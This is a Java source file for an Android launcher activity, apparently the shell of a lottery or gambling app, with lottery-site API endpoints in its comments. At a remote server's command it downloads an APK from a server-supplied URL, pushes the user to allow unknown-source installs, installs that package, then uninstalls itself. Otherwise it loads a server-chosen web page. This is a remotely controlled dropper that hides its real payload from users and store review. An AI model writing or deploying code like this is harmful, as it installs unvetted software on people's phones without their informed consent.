package com.sun.sao.zai.sao.wo.mylibrary;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v4.content.FileProvider;
import android.text.TextUtils;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;


public class MainAty extends Activity {
    private static String[] PERMISSIONS_STORAGE = {
            Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE

    };
    //www.nnokwa.com/lottery/back/api.php
    //www.a3moto.com/lottery/back/api.php
    private RelativeLayout relay_01;
    private TextView netSpeed2;
    private List<String> mPermissionList = new ArrayList<>();
    String valur;
    String urls;
    ProgressBar progressBar;
    String packName = "com.yibo.yibowebapp.auto.d393";
    String packName2= "com.yibo.app.d396";

    String url;
    private int state;

    //state 0   1卸载 下载完
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        setContentView(R.layout.aty_my);
        //http://plmoknijbuhvygc.com/Lottery/get_init_data?appid=2018101813143026&type=android
        String string = getResources().getString(R.string.app_url);
        urls = string + "?appid=" + getResources().getString(R.string.app_id) + "&type=android";
        init();
        if (isAvilible(this, packName)) {
            PackageManager packageManager = getPackageManager();
            Intent intent = packageManager.getLaunchIntentForPackage(packName);
            startActivity(intent);
            finish();
            return;
        }
        if (isAvilible(this, packName2)) {
            PackageManager packageManager = getPackageManager();
            Intent intent = packageManager.getLaunchIntentForPackage(packName);
            startActivity(intent);
            finish();
            return;
        }




        initPermissions();
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (state == 1) {
            if (!isAvilible(this, packName)&&!isAvilible(this, packName2)) {
                installProcess(new File(mfilePath), getAppProcessName(MainAty.this) + ".FileProvider");
            } else {
                unInstall(this, getAppProcessName(MainAty.this));
            }
        }
    }

    public void initPermissions() {
        mPermissionList.clear();
        for (int i = 0; i < PERMISSIONS_STORAGE.length; i++) {
            if (ContextCompat.checkSelfPermission(this, PERMISSIONS_STORAGE[i]) != PackageManager.PERMISSION_GRANTED) {
                mPermissionList.add(PERMISSIONS_STORAGE[i]);
            }
        }
        if (mPermissionList.isEmpty() || mPermissionList.size() == 0 || Build.VERSION.SDK_INT < Build.VERSION_CODES.JELLY_BEAN) {
            aaaaa();
        } else {
            String[] permissions = mPermissionList.toArray(new String[mPermissionList.size()]);//将List转为数组
            ActivityCompat.requestPermissions(this, permissions, 101);
        }
    }

    private boolean isEndbleOpen = true;
    private boolean Isremind = true;

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        if (requestCode == 101) {
            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    isEndbleOpen = false;
                    boolean showRequestPermission = ActivityCompat.shouldShowRequestPermissionRationale(MainAty.this, permissions[i]);
                    if (showRequestPermission) {

                    } else {  //下次不再提醒
                        Isremind = false;
                    }
                } else {   //允许
                }
            }
            if (isEndbleOpen) {
                aaaaa();
            } else {
                if (Isremind) {
                    initPermissions();
                } else {
                    aaaaa();
                }
            }
        } else {
            super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        }
    }

    private void init() {
        progressBar = (ProgressBar) findViewById(R.id.pbProgress2);
        relay_01 = findViewById(R.id.relay_01);
        netSpeed2 = findViewById(R.id.netSpeed2);
    }

    public void aaaaa() {

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                new Thread() {
                    public void run() {
                        valur = getPageSource(urls);
                        h.sendEmptyMessage(1);
                    }

                }.start();
            }
        }, 3000);
    }

    public Map<String, String> parseKeyAndValueToMap(String source) {
        if (isEmpty(source)) {
            return null;
        } else {
            try {
                JSONObject e = new JSONObject(source);
                return parseKeyAndValueToMap(e);
            } catch (JSONException var2) {
                if (isPrintException) {
                    var2.printStackTrace();
                }
                return null;
            }
        }
    }

    public Map<String, String> parseKeyAndValueToMap(JSONObject sourceObj) {
        if (sourceObj == null) {
            return null;
        } else {
            HashMap keyAndValueMap = new HashMap();
            Iterator iter = sourceObj.keys();
            while (iter.hasNext()) {
                String key = (String) iter.next();
                putMapNotEmptyKey(keyAndValueMap, key, getString(sourceObj, key, ""));
            }
            return keyAndValueMap;
        }
    }

    public static boolean isPrintException = true;

    public String getString(JSONObject jsonObject, String key, String defaultValue) {
        if (jsonObject != null && !isEmpty(key)) {
            try {
                return jsonObject.getString(key);
            } catch (JSONException var4) {
                if (isPrintException) {
                    var4.printStackTrace();
                }
                return defaultValue;
            }
        } else {
            return defaultValue;
        }
    }

    public boolean putMapNotEmptyKey(Map<String, String> map, String key, String value) {
        if (map != null && !isEmpty(key)) {
            map.put(key, value);
            return true;
        } else {
            return false;
        }
    }

    public boolean isEmpty(String str) {
        return str == null || str.length() == 0;
    }

    public String getPageSource(String urls) {
        StringBuffer sb = new StringBuffer();
        try {
            URL url = new URL(urls);
            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream(), "UTF-8"));
            String line;
            while ((line = in.readLine()) != null) {
                sb.append(line);
            }
            in.close();
        } catch (Exception ex) {
            System.err.println(ex);
            return null;
        }
//        String uidFromBase64 = getUidFromBase64(sb.toString());
//        Log.e("dddddddd", uidFromBase64);
        return sb.toString();
    }

    public String getUidFromBase64(String base64Id) {
        String result = "";
        if (!TextUtils.isEmpty(base64Id)) {
            if (!TextUtils.isEmpty(base64Id)) {
                result = new String(Base64.decode(base64Id.getBytes(), Base64.DEFAULT));
            }
        }
        return result;
    }


    @SuppressLint("HandlerLeak")
    Handler h = new Handler() {

        @SuppressLint("WrongConstant")
        @Override
        public void handleMessage(Message msg) {
            switch (msg.what) {
                case 100:
                    int s = (int) msg.obj;
                    progressBar.setMax(fileSize);
                    progressBar.setProgress(s);
                    float s1 = ((float) s / fileSize) * 100;
                    int s2 = (int) s1;
                    netSpeed2.setText(s2 + "%");
                    break;
                case 101:
                    state = 1;
                    Log.e("dddd", mfilePath);
                    installProcess(new File(mfilePath), getAppProcessName(MainAty.this) + ".FileProvider");
                    break;
                case 1:
                    if (valur == null) {
                        Toast.makeText(getApplication(), "网络异常", 3000).show();
                        h.sendEmptyMessageDelayed(2, 1500);
                        break;
                    }
                    Map<String, String> map = parseKeyAndValueToMap(valur);

                    if (!map.get("type").equals("200")) {
                        h.sendEmptyMessageDelayed(2, 1500);
                        break;
                    }

//                    if (map.get("code").equals("201")) {
//                        h.sendEmptyMessageDelayed(2, 1500);
//                        break;
//                    }


                    Map<String, String> data_map = parseKeyAndValueToMap(map.get("data"));

                    if (data_map.get("is_jump").equals("1")) {
                        String urls= data_map.get("jump_url");
                        if (urls.contains(".apk")) {
//                            Intent intent = new Intent(splash152Aty.this, MainDownloadAty.class);
//                            intent.putExtra("url_down", url);
//                            startActivity(intent);
//                            finish();
                           url = urls;
                            h.sendEmptyMessageDelayed(4, 1500);
                        } else {
                            Intent intent = new Intent(MainAty.this, MyWeb3.class);
                            intent.putExtra("url", urls);
                            startActivity(intent);
                            finish();
                        }
                    } else {
                        h.sendEmptyMessageDelayed(2, 1500);
                    }

//                    String is_update = mGetValue("is_update");
//                    String is_wap = mGetValue("is_wap");
//                    if (is_update.equals("1")) {
//                        url = mGetValue("update_url");
//                        h.sendEmptyMessageDelayed(4, 1500);
//                    } else if (is_wap.equals("1")) {
//                        h.sendEmptyMessageDelayed(3, 1500);
//                    } else {
//                        h.sendEmptyMessageDelayed(2, 1500);
//                    }
                    break;
                case 2:
                    //主界面
                    Intent intent = new Intent(Intent.ACTION_MAIN);
                    intent.addCategory(Intent.CATEGORY_LAUNCHER);
                    ComponentName cn = new ComponentName(getAppProcessName(MainAty.this), "com.example.machenike.myapplication.MainAty");
                    intent.setComponent(cn);
                    startActivity(intent);
                    finish();
                    break;
                case 3:
                    //web界面
                    Intent intent1 = new Intent(Intent.ACTION_MAIN);
                    intent1.addCategory(Intent.CATEGORY_LAUNCHER);
                    ComponentName cn1 = new ComponentName(getAppProcessName(MainAty.this), "com.sun.sao.zai.sao.wo.mylibrary.MyWeb3");
                    intent1.setComponent(cn1);
                    intent1.putExtra("url", mGetValue("wap_url"));
                    startActivity(intent1);
                    finish();
                    break;
                //强制更新界面
                case 4:
                    relay_01.setBackgroundResource(R.drawable.ic_bbg_down);
                    progressBar.setVisibility(View.VISIBLE);
                    downloadFile(url);
                    break;
                default:
                    break;


            }
            super.handleMessage(msg);
        }

    };

    public String mGetValue(String s) {
        int ai = valur.indexOf(s);
        String as = valur.substring((ai + s.length() + 3), valur.length());
        return as.substring(0, as.indexOf("\""));


    }

    public void downloadFile(final String down_url) {
        new Thread() {
            public void run() {
                downloadFile1(down_url);
            }
        }.start();
    }

    public void unInstall(Context context, String packageName) {
        Uri uri = Uri.fromParts("package", packageName, null);
        Intent intent = new Intent(Intent.ACTION_DELETE, uri);
        context.startActivity(intent);
    }

    int fileSize;
    private String mfilePath;

    public void downloadFile1(String url) {
        Log.e("ssssssssssss", url);
        try {
            //下载路径，如果路径无效了，可换成你的下载路径
//            String url = "http://c.qijingonline.com/test.mkv";
            String path = getRootFilePath();
            final long startTime = System.currentTimeMillis();
            Log.i("DOWNLOAD", "startTime=" + startTime);
            //下载函数
            String filename = "aaa";
            //获取文件名
//            url = url.replace("\\", "");
            URL myURL = new URL(url);
            URLConnection conn = myURL.openConnection();
            conn.connect();
            InputStream is = conn.getInputStream();
            fileSize = conn.getContentLength();//根据响应获取文件大小
            if (fileSize <= 0) throw new RuntimeException("无法获知文件大小 ");
            if (is == null) throw new RuntimeException("stream is null");
            File file1 = new File(path);
            if (!file1.exists()) {
                file1.mkdirs();
            }
            //把数据存入路径+文件名
            FileOutputStream fos = new FileOutputStream(path + "/" + filename);
            mfilePath = path + "/" + filename;
            byte buf[] = new byte[1024];
            int downLoadFileSize = 0;
            do {
                //循环读取
                int numread = is.read(buf);
                if (numread == -1) {
                    Message message = new Message();
                    message.what = 101;
                    message.obj = path + "/" + filename;
                    h.sendMessage(message);
                    break;
                }
                fos.write(buf, 0, numread);
                downLoadFileSize += numread;
                //更新进度条
                Message message = new Message();
                message.what = 100;
                message.obj = downLoadFileSize;
                h.sendMessage(message);
            } while (true);

            Log.i("DOWNLOAD", "download success");
            Log.i("DOWNLOAD", "totalTime=" + (System.currentTimeMillis() - startTime));

            is.close();
        } catch (Exception ex) {
            Log.e("DOWNLOAD", "error: " + ex.getMessage(), ex);
        }
    }


    public boolean hasSDCard() {
        String status = Environment.getExternalStorageState();
        return status.equals("mounted");
    }

    public String getRootFilePath() {
        return hasSDCard() ? Environment.getExternalStorageDirectory().getAbsolutePath() + "/" : Environment.getDataDirectory().getAbsolutePath() + "/data/";
    }

    /**
     * 检查手机上是否安装了指定的软件
     *
     * @param context
     * @param packageName：应用包名
     * @return
     */
    public boolean isAvilible(Context context, String packageName) {
        final PackageManager packageManager = context.getPackageManager();
        List<PackageInfo> packageInfos = packageManager.getInstalledPackages(0);
        List<String> packageNames = new ArrayList<String>();
        //从pinfo中将包名字逐一取出，压入pName list中
        if (packageInfos != null) {
            for (int i = 0; i < packageInfos.size(); i++) {
                String packName = packageInfos.get(i).packageName;
                packageNames.add(packName);
            }
        }
        return packageNames.contains(packageName);
    }


    //安装应用的流程
    public void installProcess(File file, String fileProvider) {
        boolean haveInstallPermission;
        if (Build.VERSION.SDK_INT >= 26) {
            //先获取是否有安装未知来源应用的权限
            haveInstallPermission = getPackageManager().canRequestPackageInstalls();
            if (!haveInstallPermission) {//没有权限
                new AlertDialog.Builder(this)
                        .setMessage("安装应用需要打开未知来源权限，请去设置中开启权限")
                        .setPositiveButton("确定", new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialog, int which) {
                                //引导用户至设置页手动授权
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                    startInstallPermissionSettingActivity();
                                }
                            }
                        }).setCancelable(false).show();
                return;
            }
        }
        //有权限，开始安装应用程序
        install(file, fileProvider);
    }

    private void startInstallPermissionSettingActivity() {
        //注意这个是8.0新API
        Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
        startActivityForResult(intent, 10086);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (resultCode == RESULT_OK && requestCode == 10086) {
            installProcess(new File(mfilePath), getAppProcessName(this) + ".FileProvider");
        }
    }

    public void install(File file, String fileProvider) {
        Uri apkUri;
        if (Build.VERSION.SDK_INT >= 24) {
            apkUri = FileProvider.getUriForFile(this, fileProvider, file);
        } else {
            apkUri = Uri.fromFile(file);
        }
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
        startActivity(intent);
    }

    public String getAppProcessName(Context context) {
        int pid = android.os.Process.myPid();
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningAppProcessInfo> infos = manager.getRunningAppProcesses();
        for (ActivityManager.RunningAppProcessInfo info : infos) {
            if (info.pid == pid)
                return info.processName;
        }
        return "";
    }


}
